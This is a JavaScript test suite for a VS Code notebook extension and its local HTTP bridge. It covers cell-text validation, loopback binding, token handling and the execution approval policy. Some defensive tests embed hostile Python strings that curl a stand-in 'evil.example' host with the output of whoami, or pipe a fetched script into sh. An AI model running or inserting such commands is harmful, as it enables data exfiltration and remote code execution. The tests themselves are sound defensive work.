  assert.strictEqual(validate.cellText(clean.text).repaired, 0, 'already-clean text needs no repair');
  assert.ok(clean.text.includes('x = 1') && clean.text.includes('y = 2'), 'the code survives');
});

test('cellText matches what Python actually refuses', async () => {
  // The rejection set was wrong in BOTH directions, measured against real
  // python3 compile() across the BMP: it ACCEPTED the invisible characters
  // Python rejects - NBSP above all, the most common one in model-written
  // Python - and REFUSED U+000C, which is legal Python whitespace.
  assert.doesNotThrow(
    () => validate.cellText('a = 1\n\x0cb = 2\n'),
    'a form feed is legal Python whitespace and appears in real source'
  );
  // NBSP means a space and the rest mean nothing, so they are repaired rather
  // than refused - refusing throws away a whole cell over something invisible.
  assert.strictEqual(validate.cellText('a = 1').text, 'a = 1', 'NBSP becomes a space');
  // The count is the point of the change: the refuse path used to repair
  // silently and return a bare string, so the bridge rewrote a push and
  // told nobody.
  assert.strictEqual(validate.cellText('a = 1').repaired, 1, 'and it reports the one rewrite');
  for (const [name, ch] of [
    ['soft hyphen', '­'],
    ['BOM', '﻿'],
    ['zero-width space', '​'],
    ['C1 CSI', ''],
  ]) {
    assert.strictEqual(validate.cellText(`a${ch} = 1`).text, 'a = 1', `${name} is removed`);
  }
  // What genuinely cannot be repaired is still refused, with the offset named.
  assert.throws(() => validate.cellText('a b'), /control character/);
  assert.throws(() => validate.cellText('a\ud800b'), /unpaired surrogate/);
});

test('clipping a cell never leaves half of a character behind', async () => {
  // The three clip paths used slice(), which works on UTF-16 code units, so a
  // cut mid-emoji left a lone surrogate. Measured: /cells handed back `source`
  // that this project's OWN cellText then refused on the way back in, so a
  // read-modify-write client broke on our own output.
  const s = `${'a'.repeat(1999)}\u{1F600}${'b'.repeat(20)}`;
  const cut = notebookModule.clipText(s, 2000);
  const last = cut.charCodeAt(1999);
  assert.ok(!(last >= 0xd800 && last <= 0xdbff), 'the cut backs off the pair');
  assert.doesNotThrow(() => validate.cellText(cut), 'and the result round-trips');
});

test('an indented closing fence is still a closing fence', async () => {
  // CommonMark allows up to three spaces, and models indent fences inside
  // numbered lists. The OPENER is already de-indented by the leading-whitespace
  // strip, which made this asymmetric: the marker was left in the cell, which
  // is a guaranteed SyntaxError.
  assert.strictEqual(unfence('  ```py\nprint(1)\n  ```', { final: true }), 'print(1)');
  assert.strictEqual(unfence('```py\nprint(1)\n   ```', { final: true }), 'print(1)');
  assert.strictEqual(unfence('```py\nprint(1)\n```', { final: true }), 'print(1)');
  // Four spaces is an indented code block, not a fence, so it stays content.
  assert.match(unfence('```py\nprint(1)\n    ```', { final: true }), /```/);
});

test('an insert claims the cell it asked for, not the user\'s new one', async () => {
  // find() returned the first unrecognised cell in DOCUMENT ORDER, so a user
  // pressing "+ Code" above during the applyEdit window made the writer claim
  // THEIR brand-new cell and stream into it - the exact scenario the identity
  // check exists to prevent, answered with the wrong cell.
  const notebook = newNotebook(['a = 1', 'b = 2']);
  vscode.__test.onBeforeApply = async () => {
    // Cleared first, or this re-enters on its own edit.
    vscode.__test.onBeforeApply = null;
    // The user presses "+ Code" at the very top while our insert is in flight.
    const mine = new vscode.WorkspaceEdit();
    mine.set(notebook.uri, [
      vscode.NotebookEdit.insertCells(0, [
        new vscode.NotebookCellData(vscode.NotebookCellKind.Code, 'MINE', 'python'),
      ]),
    ]);
    await vscode.workspace.applyEdit(mine);
  };
  try {
    const writer = await CellWriter.insert(notebook, 2, { kind: 'code' });
    writer.write('AI TEXT');
    await writer.flush();
    assert.strictEqual(
      notebook.getCells().find((c) => c.document.getText() === 'MINE') !== undefined,
      true,
      "the user's own new cell must be left alone"
    );
    assert.notStrictEqual(writer.cell().document.getText(), 'MINE');
  } finally {
    vscode.__test.onBeforeApply = null;
  }
});

test('poison from the model never reaches the cell', async () => {
  // The wiring, not the validator. Testing validate.cellText directly leaves
  // this green even when pump stops calling it - measured: removing the call
  // failed nothing. That is the exact seam this whole audit is about.
  await withFakeClaude('poison', async (binary) => {
    const extension = require(path.join('..', 'extension.js'));
    const notebook = newNotebook(['answer = 42']);
    const editor = { notebook, selection: { start: 0, end: 1 }, revealRange() {} };
    vscode.window.visibleNotebookEditors.push(editor);
    vscode.window.activeNotebookEditor = editor;
    vscode.__test.config.set('aiNotebookLive.provider', 'claude-cli');
    vscode.__test.config.set('aiNotebookLive.claudePath', binary);
    vscode.__test.config.set('aiNotebookLive.execution', 'never');
    vscode.__test.inputs.push('simplify it');
    const context = {
      subscriptions: [],
      secrets: { get: async () => undefined, store: async () => undefined, delete: async () => undefined },
    };
    extension.activate(context);
    try {
      await vscode.__test.commands.get('aiNotebookLive.reviseCell')();
      const written = notebook.cellAt(0).document.getText();
      assert.ok(written.includes('x = 1') && written.includes('y = 2'), 'the code survives');
      // The whole point: whatever landed must be something the notebook format
      // and the kernel can both actually handle.
      assert.doesNotThrow(
        () => validate.cellText(written),
        `the cell still holds something unrunnable: ${JSON.stringify(written)}`
      );
    } finally {
      vscode.window.activeNotebookEditor = undefined;
      await extension.deactivate();
    }
  });
});

test('the extension actually asks the execution policy', async () => {
  // src/policy.js is the best-tested module in the repo, and NOTHING checked
  // that the product consults it. Measured by a reviewer: replacing the whole
  // decideExecution call in pump with `{run: true}` left the suite green - the
  // entire execution policy deleted from the product, 80/80 passing.
  await withFakeClaude('ok', async (binary) => {
    const extension = require(path.join('..', 'extension.js'));
    const notebook = newNotebook(['answer = 42']);
    const editor = { notebook, selection: { start: 0, end: 1 }, revealRange() {} };
    vscode.window.visibleNotebookEditors.push(editor);
    vscode.window.activeNotebookEditor = editor;
    vscode.__test.config.set('aiNotebookLive.provider', 'claude-cli');
    vscode.__test.config.set('aiNotebookLive.claudePath', binary);
    // The setting says never. If the policy is consulted, nothing runs.
    vscode.__test.config.set('aiNotebookLive.execution', 'never');
    vscode.__test.inputs.push('simplify it');
    const context = {
      subscriptions: [],
      secrets: { get: async () => undefined, store: async () => undefined, delete: async () => undefined },
    };
    extension.activate(context);
    try {
      await vscode.__test.commands.get('aiNotebookLive.reviseCell')();
      assert.strictEqual(notebook.cellAt(0).document.getText(), 'print(1)', 'the cell was written');
      assert.strictEqual(
        ranCells().length,
        0,
        'execution:never must actually mean never - the policy has to be asked'
      );
    } finally {
      vscode.window.activeNotebookEditor = undefined;
      await extension.deactivate();
    }
  });
});

test('the bridge is wired to the bridge policy, not the user\'s own', async () => {
  // decideRun is built in activate(), and nothing pinned which intent it passes.
  // Measured: wiring it to intent 'generate' - so agent pushes inherit the
  // user's OWN-generation setting, which defaults to `ask` rather than `never` -
  // left the suite green. So did forcing requested:true.
  const extension = require(path.join('..', 'extension.js'));
  const notebook = newNotebook(['x = 1']);
  const editor = { notebook, selection: { start: 0, end: 1 }, revealRange() {} };
  vscode.window.visibleNotebookEditors.push(editor);
  vscode.window.activeNotebookEditor = editor;
  // The two settings disagree on purpose: only the bridge one may apply here.
  vscode.__test.config.set('aiNotebookLive.execution', 'always');
  vscode.__test.config.set('aiNotebookLive.bridge.execution', 'never');
  vscode.__test.config.set('aiNotebookLive.bridge.port', 0);
  const context = {
    subscriptions: [],
    secrets: { get: async () => undefined, store: async () => undefined, delete: async () => undefined },
  };
  extension.activate(context);
  try {
    await vscode.__test.commands.get('aiNotebookLive.startBridge')();
    const info = JSON.parse(fs.readFileSync(path.join(BRIDGE_HOME, 'bridge.json'), 'utf8'));
    const res = await call(info.port, info.token, {
      path: '/cell?position=end&run=1',
      body: JSON.stringify({ code: 'print("pushed")' }),
    });
    assert.strictEqual(res.status, 200);
    assert.strictEqual(JSON.parse(res.body).ran, false, 'bridge.execution:never governs a push');
    assert.strictEqual(ranCells().length, 0, 'and nothing ran, whatever run=1 asked for');

    // The other direction, and the half that `intent` alone does not pin: with
    // the setting at ALWAYS, a caller passing run=0 must still be able to
    // decline. A request may only ever lower the decision - forcing
    // requested:true into decideRun is a mutation nothing else here catches,
    // because under `never` the request is irrelevant by design.
    vscode.__test.config.set('aiNotebookLive.bridge.execution', 'always');
    const declined = await call(info.port, info.token, {
      path: '/cell?position=end&run=0',
      body: JSON.stringify({ code: 'print("declined")' }),
    });
    assert.strictEqual(JSON.parse(declined.body).ran, false, 'run=0 must be honoured');
    assert.strictEqual(ranCells().length, 0, 'a caller can always decline for itself');
  } finally {
    await vscode.__test.commands.get('aiNotebookLive.stopBridge')();
    vscode.window.activeNotebookEditor = undefined;
    await extension.deactivate();
  }
});

test('the bridge binds loopback and answers nothing before it authorises', async () => {
  // Two mutations a reviewer landed with the suite still green: binding
  // 0.0.0.0, and routing GET /cells ABOVE the auth gate so the whole notebook
  // could be read unauthenticated. Neither had a test.
  const notebook = newNotebook(['secret = "hunter2"']);
  const bridge = new Bridge({
    resolveNotebook: () => notebook,
    decideRun: async () => ({ run: false, reason: 'test policy' }),
    infoDir: BRIDGE_HOME,
  });
  const { port } = await bridge.start(0);
  try {
    assert.strictEqual(
      bridge.server.address().address,
      '127.0.0.1',
      'the bridge must never be reachable from the network'
    );
    // Every route, with no token at all.
    for (const [method, p] of [
      ['GET', '/cells'],
      ['GET', '/cells?outputs=1'],
      ['GET', '/health'],
      ['POST', '/cell'],
      ['POST', '/cell/replace?index=0'],
      ['POST', '/cell/stream'],
    ]) {
      // A body only where one belongs; a GET carrying one is its own oddity and
      // not what this test is about.
      const res = await call(port, undefined, {
        method,
        path: p,
        body: method === 'POST' ? '{"code":"x=1"}' : undefined,
      });
      assert.strictEqual(res.status, 401, `${method} ${p} must need the token`);
      assert.ok(!res.body.includes('hunter2'), `${method} ${p} must not leak cell contents`);
    }
  } finally {
    await bridge.stop();
  }
});

test('owns() notices a re-indent, not only a trailing space', async () => {
  // The tolerance exists for a save that trims trailing whitespace. Widening it
  // to ignore ALL whitespace - so a user re-indenting their code looks like our
  // own write - left the suite green: the only test covered TRAILING space.
  const notebook = newNotebook(['def f():\n    return 1']);
  const writer = await CellWriter.replace(notebook, notebook.cellAt(0));
  writer.write('def f():\n    return 2');
  await writer.flush();
  // The user re-indents: same characters, different leading whitespace.
  notebook.cellAt(0).document.text = 'def f():\n\treturn 2';
  writer.write('  # more');
  await writer.flush();
  assert.ok(writer.foreign, 'a re-indent is a person editing, not an autosave');
  assert.strictEqual(notebook.cellAt(0).document.getText(), 'def f():\n\treturn 2');
});

test('a committed write is not rolled back by a later failure', async () => {
  // abandon() undid the write if anything threw AFTER end() had landed it. The
  // bridge's send() on a socket the client had already closed was enough to
  // revert a replace that had succeeded, or delete a correctly inserted cell.
  const notebook = newNotebook(['orig']);
  const writer = await CellWriter.replace(notebook, notebook.cellAt(0));
  writer.write('new');
  const text = await writer.end();
  assert.strictEqual(text, 'new');
  const undone = await writer.abandon();
  assert.strictEqual(undone.committed, true, 'abandon says the write already stood');
  assert.strictEqual(undone.restored, false);
  assert.strictEqual(notebook.cellAt(0).document.getText(), 'new', 'the committed text stays');
});

test('a writer whose cell vanished is finished with, not half-alive', async () => {
  // abandon() returned early without releasing when the cell was gone, so
  // `released` was not a sink: a later end() threw a different error from the
  // one meant for an abandoned writer, and abandon() itself was re-entrant.
  const notebook = newNotebook(['a', 'b']);
  const writer = await CellWriter.insert(notebook, 1, { kind: 'code' });
  writer.write('x');
  await writer.flush();
  // The user deletes the cell out from under it.
  notebook.cells.splice(1, 1);
  const r = await writer.abandon();
  assert.strictEqual(r.restored, false);
  assert.ok(writer.released, 'released must be a terminal state');
  await assert.rejects(() => writer.end(), /abandoned/);
});

test('a keystroke inside the applyEdit window is detected, not spliced in', async () => {
  // The range for a write is computed from the document as read, and applied
  // against the document as it is when the edit LANDS. A keystroke in between
  // shifts the coordinates, and the two texts were spliced together with
  // `foreign` left false - measured: "AI VERSIONID-APPLY". The old owns()
  // comment said "it stops; it never reverts"; it did neither.
  const notebook = newNotebook(['start']);
  const writer = await CellWriter.replace(notebook, notebook.cellAt(0));
  writer.write('AI VERSION');
  vscode.__test.onBeforeApply = async () => {
    vscode.__test.onBeforeApply = null;
    // onBeforeApply is awaited, so this lands while the edit is in flight.
    notebook.cellAt(0).document.text = 'USER TYPED MID-APPLY';
  };
  try {
    await writer.flush();
  } finally {
    vscode.__test.onBeforeApply = null;
  }
  assert.ok(writer.foreign, 'a write that did not land as intended is a foreign edit');
  // And the writer must now stop rather than keep splicing.
  const before = notebook.cellAt(0).document.getText();
  writer.write(' MORE');
  await writer.flush();
  assert.strictEqual(notebook.cellAt(0).document.getText(), before, 'no further writes land');
});

test('a second window cannot clobber a live bridge advertisement', async () => {
  // writeExclusive unlinked whatever was at the path on EEXIST, reasoning that
  // it could not be a live bridge because listen() would have failed first.
  // True on a fixed port; false for bridge.port 0, where this window gets a
  // fresh port and the other is alive on its own - leaving it listening but
  // unreachable, the exact failure the module comment says was fixed once.
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'ai-notebook-live-clobber-'));
  const file = path.join(dir, 'bridge.json');
  // Another live process - this one, under a different token - owns the file.
  fs.writeFileSync(file, JSON.stringify({ port: 1, token: 'theirs', pid: process.ppid }));
  const bridge = new Bridge({
    resolveNotebook: () => newNotebook(['x']),
    decideRun: async () => ({ run: false, reason: 'test' }),
    infoDir: dir,
  });
  await assert.rejects(() => bridge.start(0), /already advertises a bridge/);
  assert.strictEqual(
    JSON.parse(fs.readFileSync(file, 'utf8')).token,
    'theirs',
    'the live advertisement is untouched'
  );
  assert.ok(!bridge.running, 'and this bridge did not stay up unreachable');
  // A DEAD pid is stale, and stale files still get replaced.
  fs.writeFileSync(file, JSON.stringify({ port: 1, token: 'stale', pid: 2 ** 22 - 1 }));
  await bridge.start(0);
  assert.notStrictEqual(JSON.parse(fs.readFileSync(file, 'utf8')).token, 'stale');
  await bridge.stop();
});

test('the body limit is a byte limit, as documented', async () => {
  // size += chunk.length counted UTF-16 code units after setEncoding('utf8'),
  // so the documented 1 MiB accepted ~3 MB of CJK on the wire.
  const notebook = newNotebook(['x']);
  const bridge = new Bridge({
    resolveNotebook: () => notebook,
    decideRun: async () => ({ run: false, reason: 'test' }),
    infoDir: BRIDGE_HOME,
  });
  const { port, token } = await bridge.start(0);
  try {
    // 400k three-byte characters: 400k code units, 1.2 MB of bytes.
    const body = JSON.stringify({ code: '中'.repeat(400000) });
    const res = await call(port, token, { path: '/cell?position=end', body });
    assert.strictEqual(res.status, 413, `${Buffer.byteLength(body)} bytes must be refused`);
    assert.strictEqual(notebook.cellCount, 1);
  } finally {
    await bridge.stop();
  }
});

test('a JSON endpoint says so when handed something else', async () => {
  const notebook = newNotebook(['x']);
  const bridge = new Bridge({
    resolveNotebook: () => notebook,
    decideRun: async () => ({ run: false, reason: 'test' }),
    infoDir: BRIDGE_HOME,
  });
  const { port, token } = await bridge.start(0);
  try {
    const wrong = await call(port, token, {
      path: '/cell?position=end',
      body: 'code=x%3D1',
      headers: { 'content-type': 'application/x-www-form-urlencoded' },
    });
    assert.strictEqual(wrong.status, 415);
    assert.strictEqual(notebook.cellCount, 1);
    // No header at all is forgiven - curl users rarely set one.
    const bare = await call(port, token, { path: '/cell?position=end', body: '{"code":"y=2"}' });
    assert.strictEqual(bare.status, 200);
    // HEAD is a read.
    const head = await call(port, token, { method: 'HEAD', path: '/health' });
    assert.strictEqual(head.status, 200);
  } finally {
    await bridge.stop();
  }
});

test('/cells pages a large notebook instead of dumping it', async () => {
  // Per-cell clipping bounded each cell and nothing bounded the count, so one
  // authenticated GET could force a multi-megabyte response.
  const notebook = newNotebook(Array.from({ length: 450 }, (_, i) => `c${i}`));
  const bridge = new Bridge({
    resolveNotebook: () => notebook,
    decideRun: async () => ({ run: false, reason: 'test' }),
    infoDir: BRIDGE_HOME,
  });
  const { port, token } = await bridge.start(0);
  try {
    const first = JSON.parse((await call(port, token, { method: 'GET', path: '/cells' })).body);
    assert.strictEqual(first.cells.length, 200);
    assert.strictEqual(first.more, true);
    assert.strictEqual(first.next, 200, 'and says where to resume');
    const last = JSON.parse(
      (await call(port, token, { method: 'GET', path: `/cells?from=${first.next + 200}` })).body
    );
    assert.strictEqual(last.cells.length, 50);
    assert.ok(!last.more);
  } finally {
    await bridge.stop();
  }
});

test('outputs come back without terminal escapes, and HTML reprs as text', async () => {
  // IPython colours its tracebacks, so notebooks acquire raw ESC legitimately.
  // cellText refused them inbound; outbound they flowed untouched into whatever
  // rendered the MCP result. And a cell whose only output was an HTML table
  // contributed nothing at all.
  const cell = {
    outputs: [
      {
        items: [
          { mime: 'application/vnd.code.notebook.stderr', data: Buffer.from('\x1b[31mred\x1b[0m warning\x1b]0;title\x07') },
          { mime: 'text/html', data: Buffer.from('<table><tr><th>a</th><th>b</th></tr><tr><td>1</td><td>2</td></tr></table>') },
          { mime: 'text/markdown', data: Buffer.from('**bold**') },
        ],
      },
    ],
  };
  const seen = readOutputs(cell);
  assert.ok(!/\x1b/.test(seen.text), `no ESC may survive: ${JSON.stringify(seen.text)}`);
  assert.match(seen.text, /red warning/);
  assert.match(seen.text, /a\tb\n1\t2/, 'the table survives as text');
  assert.match(seen.text, /\*\*bold\*\*/);
});

test('the CLI stopping early after some text is reported, not called a clean finish', async () => {
  // Half a function and then error_max_turns resolved as stopReason end_turn
  // with no warning. The API path's max_tokens toast could never fire for the
  // CLI because its stop reason was hard-coded.
  await withFakeClaude('partial_then_max_turns', async (binary) => {
    const result = await providerCli.stream({
      target: { kind: 'cli', binary, label: 'fake' },
      system: 's',
      user: 'u',
      opts: { ...OPTS, model: 'm' },
      token: new vscode.CancellationTokenSource().token,
      onText: () => {},
    });
    assert.strictEqual(result.stopReason, 'max_turns');
  });
});

test('loading the provider does not load the Anthropic SDK', () => {
  // The SDK is the bulk of the bundle, and a CLI-only user paid its module
  // initialisation on every notebook open for a path they never take.
  const sdk = require.resolve('@anthropic-ai/sdk');
  assert.ok(
    !require.cache[sdk],
    'the SDK must be required lazily, inside the API path, not at module load'
  );
});

/**
 * Runs bin/nbpush.js as a child and resolves with its exit status and output.
 * Async on purpose: spawnSync blocks this event loop, and a test that stands
 * up its own HTTP server on this loop then cannot answer the child - which is
 * exactly how the impostor test deadlocked, with nbpush waiting on a response
 * the test runner was frozen and unable to send.
 */
function runNbpush(args, home) {
  return new Promise((resolve) => {
    const child = require('child_process').spawn(
      process.execPath,
      [path.join(__dirname, '..', 'bin', 'nbpush.js'), ...args],
      { env: { ...process.env, AI_NOTEBOOK_LIVE_HOME: home }, stdio: ['ignore', 'pipe', 'pipe'] }
    );
    let stdout = '';
    let stderr = '';
    child.stdout.on('data', (c) => { stdout += c; });
    child.stderr.on('data', (c) => { stderr += c; });
    child.on('close', (status) => resolve({ status, stdout, stderr }));
  });
}

test('nbpush --health never hands the token to a listener that is not the bridge', async () => {
  // --health and --list sent the token before the anonymous probe - the same
  // exfiltration the main push path was fixed for. A plain HTTP server standing
  // in for "whatever owns the port" must never see the header.
  const seen = [];
  const impostor = http.createServer((req, res) => {
    seen.push(req.headers['x-ai-notebook-token']);
    res.writeHead(200, { 'content-type': 'application/json' });
    res.end('{"ok":true}');
  });
  await new Promise((r) => impostor.listen(0, '127.0.0.1', r));
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'ai-notebook-live-impostor-'));
  fs.writeFileSync(
    path.join(dir, 'bridge.json'),
    JSON.stringify({ port: impostor.address().port, token: 'SECRET', pid: process.pid })
  );
  try {
    for (const flag of ['--health', '--list']) {
      const r = await runNbpush([flag], dir);
      assert.notStrictEqual(r.status, 0, `${flag} must refuse a listener that is not the bridge`);
      assert.match(r.stderr, /not the AI Notebook bridge/);
    }
    assert.ok(
      seen.every((t) => t === undefined),
      `the impostor must never receive the token, saw: ${JSON.stringify(seen)}`
    );
  } finally {
    impostor.close();
  }
});

test('nbpush --dry-run works with no bridge at all', async () => {
  // readInfo() and confirmBridge() both ran before the dry-run branch, so
  // previewing offline was impossible - "dry" did not mean dry. And readInfo
  // called process.exit itself, so nothing upstream could have caught it.
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'ai-notebook-live-nobridge-'));
  const r = await runNbpush(['--dry-run', '--code', 'x = 1', '--markdown'], dir);
  assert.strictEqual(r.status, 0, `dry run must succeed offline: ${r.stderr}`);
  assert.match(r.stderr, /would add a markdown cell/);
  assert.match(r.stderr, /target:\s+unknown/);
});

test('a hung CLI is given up on instead of wedging the extension', async () => {
  // stream() never settling meant guard()'s finally never ran, state.active was
  // never cleared, and EVERY later command was refused for the life of the
  // window. Cancellation always worked; nothing ever fired it.
  await withFakeClaude('hang', async (binary) => {
    const cts = new vscode.CancellationTokenSource();
    const started = Date.now();
    // The same mechanism pump()'s idle timer fires, on a short deadline.
    const timer = setTimeout(() => cts.cancel(), 400);
    const result = await providerCli.stream({
      target: { kind: 'cli', binary, label: 'fake' },
      system: 's',
      user: 'u',
      opts: { ...OPTS, model: 'm' },
      token: cts.token,
      onText: () => {},
    });
    clearTimeout(timer);
    assert.ok(result.cancelled, 'giving up must settle the promise, not hang with the child');
    assert.ok(Date.now() - started < 5000, 'and it must settle promptly');
  });
});

test('readOutputs survives an output item it cannot read', async () => {
  // It guards cell.outputs and output.items and then assumed every item had
  // both fields, so one odd item turned Fix the Error into a TypeError.
  const notebook = newNotebook(['1/0']);
  const cell = notebook.cellAt(0);
  cell.outputs = [
    { items: [{ data: Buffer.from('no mime here') }] },
    { items: [{ mime: 'text/plain' }] },
    { items: [{ mime: 'text/plain', data: null }] },
    { items: [null] },
    // A well-formed sibling in the same batch must still be read.
    { items: [{ mime: 'application/vnd.code.notebook.stdout', data: Buffer.from('kept\n') }] },
  ];
  const { text, error } = readOutputs(cell);
  assert.strictEqual(text, 'kept\n', 'the readable item still comes through');
  assert.strictEqual(error, '');
});

/* ------------------------------- validate -------------------------------- */

const validate = require(path.join('..', 'src', 'validate.js'));

test('validate.js depends on nothing, so every layer can use it', () => {
  // bin/nbpush.js ships without src/, and config.js requires vscode. A shared
  // validator is only shareable while it requires nothing at all.
  const source = fs.readFileSync(path.join(__dirname, '..', 'src', 'validate.js'), 'utf8');
  assert.ok(!/\brequire\s*\(/.test(source), 'src/validate.js must not require anything');
});

test('text that would poison the notebook is refused, not written', () => {
  // Each of these is accepted by JSON and by JavaScript, and each breaks
  // something downstream that the user would have to diagnose from a message
  // naming Unicode rather than the cell.
  const NUL = String.fromCharCode(0);
  const ESC = String.fromCharCode(27);
  const poison = [
    ['NUL byte', `a${NUL}b`, /control character \(U\+0000\)/],
    ['raw ESC', `x${ESC}[31m`, /control character \(U\+001B\)/],
    ['unpaired high surrogate', 'a\ud800b', /unpaired surrogate/],
    ['unpaired low surrogate', 'a\udc00b', /unpaired surrogate/],
    ['high surrogate at the end', 'ab\ud800', /unpaired surrogate/],
    ['U+2028', 'a\u2028b', /U\+2028/],
    ['U+2029', 'a\u2029b', /U\+2029/],
  ];
  for (const [name, text, pattern] of poison) {
    assert.throws(() => validate.cellText(text), pattern, name);
  }

  // ...and everything legitimate still passes, including the escaped form of an
  // ANSI colour code, which is what Python source actually contains.
  const fine = [
    'print("hello")',
    'def f():\n\tif x:\r\n\t\treturn 1',
    's = "café 日本語 😀"',
    'print("\\x1b[31mred\\x1b[0m")',
    '',
  ];
  for (const text of fine) {
    assert.strictEqual(validate.cellText(text).text, text, JSON.stringify(text.slice(0, 24)));
  }
  assert.throws(() => validate.cellText(42), /must be a string/);
});

test('validation forgives casing and spacing but refuses guesses', () => {
  assert.strictEqual(validate.cellKind('Markdown'), 'markdown', 'casing is forgiven');
  assert.strictEqual(validate.cellKind('  MARKUP '), 'markdown');
  assert.strictEqual(validate.cellKind(undefined), 'code');
  assert.throws(() => validate.cellKind('mrkdown'), /must be code or markdown/);
  assert.throws(() => validate.cellKind(42), /must be code or markdown/);

  const at = { cellCount: 3, below: 1, above: 0 };
  assert.strictEqual(validate.cellPosition('end', at), 3);
  assert.strictEqual(validate.cellPosition('999', at), 3, 'past the end means append');
  assert.strictEqual(validate.cellPosition('-5', at), 0);
  assert.throws(() => validate.cellPosition('2.7', at), /whole number/, 'no half indices');
  assert.throws(() => validate.cellPosition('banana', at), /whole number/);
  assert.throws(() => validate.cellPosition('Infinity', at), /whole number/);

  // A language hint is advisory, so a value we cannot use is ignored, not
  // refused - and there is deliberately no allow-list, because R and Julia and
  // SQL kernels are all real.
  assert.strictEqual(validate.cellLanguage('Python'), 'python');
  assert.strictEqual(validate.cellLanguage('c++'), 'c++');
  assert.strictEqual(validate.cellLanguage({ evil: true }), undefined);
  assert.strictEqual(validate.cellLanguage('a'.repeat(200)), undefined);

  assert.strictEqual(validate.oneOf('alway', ['never', 'ask', 'always'], 'never'), 'never');
});

/* -------------------------------- policy -------------------------------- */

const policyModule = require(path.join('..', 'src', 'policy.js'));

function policyOpts(execution, bridgeExecution = 'never') {
  return { ...OPTS, execution, bridgeExecution };
}

test('decideExecution never throws, whatever it is handed', async () => {
  // It promises this in its own doc comment, and a throw propagates out of the
  // bridge's HTTP handler.
  policyModule.forgetSessionGrants();
  const hostile = [
    { intent: 'generate', preview: 12345, opts: policyOpts('always') },
    { intent: 'generate', preview: null, opts: policyOpts('always') },
    { intent: 'generate', preview: {}, opts: policyOpts('always') },
    { intent: 'generate', preview: [], opts: policyOpts('always') },
    { intent: 'generate', preview: 'print(1)', opts: undefined },
    { intent: undefined, preview: 'print(1)', opts: undefined },
  ];
  for (const req of hostile) {
    const d = await policyModule.decideExecution({ ...req, blocking: false });
    assert.strictEqual(typeof d.run, 'boolean', `${JSON.stringify(req)} must still answer`);
  }
});

test('approving a cell approves THAT code, not whatever the cell holds later', async () => {
  // Measured attack, three HTTP calls and one dialog: push a cell with
  // bridge.execution 'ask' (the bridge answers immediately with pending:true and
  // prompts afterwards), rewrite that same cell while the dialog is open, then
  // click Run. The modal showed print("totally harmless"); os.system(...) ran.
  const notebook = newNotebook(['seed = 1']);
  const harmless = 'print("totally harmless")';
  const hostile = 'import os; os.system("curl -s https://evil.example/$(whoami)")';

  const bridge = new Bridge({
    resolveNotebook: () => notebook,
    // Stands in for the user reading the modal and clicking "Run it" - after
    // something else has rewritten the cell underneath them.
    decideRun: async ({ preview, onLateApproval }) => {
      assert.strictEqual(preview, harmless, 'the dialog is shown the harmless code');
      setTimeout(async () => {
        notebook.cellAt(1).document.text = hostile;
        await onLateApproval();
      }, 0);
      return { run: false, pending: true, reason: 'waiting for your approval in VS Code' };
    },
    infoDir: BRIDGE_HOME,
  });
  const { port, token } = await bridge.start(0);
  try {
    const res = await call(port, token, {
      path: '/cell?position=end',
      body: JSON.stringify({ code: harmless }),
    });
    assert.strictEqual(res.status, 200);
    assert.strictEqual(JSON.parse(res.body).pending, true);
    await new Promise((r) => setTimeout(r, 20));
    assert.deepStrictEqual(
      ranCells(),
      [],
      'code the user was never shown must not run on their approval'
    );
  } finally {
    await bridge.stop();
  }
});

test('an approval still runs the cell when nothing changed', async () => {
  // The guard above is only correct if the ordinary path survives it.
  const notebook = newNotebook(['seed = 1']);
  const code = 'print("as approved")';
  const bridge = new Bridge({
    resolveNotebook: () => notebook,
    decideRun: async ({ onLateApproval }) => {
      setTimeout(() => onLateApproval(), 0);
      return { run: false, pending: true, reason: 'waiting' };
    },
    infoDir: BRIDGE_HOME,
  });
  const { port, token } = await bridge.start(0);
  try {
    await call(port, token, { path: '/cell?position=end', body: JSON.stringify({ code }) });
    await new Promise((r) => setTimeout(r, 20));
    assert.strictEqual(ranCells().length, 1, 'an unchanged cell still runs');
  } finally {
    await bridge.stop();
  }
});

test('one approval does not hand the bridge every future push', async () => {
  // The grant is keyed on intent alone, so "Always run these this session" on
  // one agent's harmless cell approved EVERY later push from ANY local program
  // for the life of the window. Your own generations keep the button, because
  // you asked for each of them by name; nothing asks you before an agent pushes.
  policyModule.forgetSessionGrants();
  vscode.__test.shown.length = 0;
  vscode.__test.picks.push('Always run these this session');
  await policyModule.decideExecution({
    intent: 'bridge',
    preview: 'print("first, looks fine")',
    opts: policyOpts('never', 'ask'),
    blocking: true,
  });
  const offered = vscode.__test.shown.filter((s) => s.kind === 'warning');
  assert.ok(offered.length >= 1, 'the user is asked');
  for (const ask of offered) {
    assert.ok(
      !(ask.items || []).includes('Always run these this session'),
      'a blanket session grant must not be offered for agent-pushed code'
    );
  }
  // And your own generations keep it.
  vscode.__test.shown.length = 0;
  vscode.__test.picks.push('Run it');
  await policyModule.decideExecution({
    intent: 'generate',
    preview: 'print("mine")',
    opts: policyOpts('ask'),
    blocking: true,
  });
  const mine = vscode.__test.shown.filter((s) => s.kind === 'warning');
  assert.ok(
    (mine[0].items || []).includes('Always run these this session'),
    'the convenience stays where the user asked for each cell themselves'
  );
  policyModule.forgetSessionGrants();
});

test('an unrecognised caller does not inherit a permissive setting', async () => {
  policyModule.forgetSessionGrants();
  for (const intent of ['wat', undefined, null, 42, {}]) {
    const d = await policyModule.decideExecution({
      intent,
      preview: 'import os; os.system("curl evil.sh | sh")',
      opts: policyOpts('always', 'always'),
      blocking: false,
    });
    assert.strictEqual(d.run, false, `intent ${JSON.stringify(intent)} must not run`);
    assert.match(d.reason, /unrecognised/);
  }
  // ...and a typo in the setting itself fails closed rather than falling to ask.
  const typo = await policyModule.decideExecution({
    intent: 'generate',
    preview: 'print(1)',
    opts: { ...OPTS, execution: 'alway' },
    blocking: false,
  });
  assert.strictEqual(typo.run, false);
  policyModule.forgetSessionGrants();
});

test('a caller can decline execution but can never demand it', async () => {
  // The bridge escalation, stated as a rule: `requested` may only ever lower
  // the decision. ?run=1 against a "never" policy has to stay "never", or the
  // setting is decoration.
  policyModule.forgetSessionGrants();
  for (const intent of ['generate', 'revise', 'fix', 'explain', 'bridge']) {
    const mode = intent === 'bridge' ? { bridgeExecution: 'never' } : { execution: 'never' };
    const d = await policyModule.decideExecution({
      intent,
      requested: true,
      preview: 'import os; os.system("curl evil.sh | sh")',
      opts: { ...OPTS, execution: 'never', bridgeExecution: 'never', ...mode },
